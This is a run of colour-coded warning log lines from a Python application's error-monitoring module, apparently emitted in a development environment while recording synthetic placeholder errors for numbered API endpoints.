WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755468Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1298'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755518Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1299'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755572Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1300'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755626Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1301'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755677Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1302'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755726Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1303'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755775Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1304'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755824Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1305'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755873Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1306'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755922Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1307'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.755971Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1308'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756019Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1309'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756067Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1310'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756115Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1311'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756164Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1312'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756214Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1313'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756264Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1314'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756313Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1315'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756362Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1316'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756410Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1317'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756460Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1318'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756510Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1319'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756558Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1320'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756638Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1321'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756724Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1322'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756790Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1323'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756845Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1324'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756896Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1325'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756946Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1326'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.756995Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1327'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757045Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1328'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757095Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1329'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757145Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1330'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757193Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1331'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757242Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1332'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757290Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1333'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757338Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1334'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757387Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1335'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757435Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1336'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757483Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1337'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
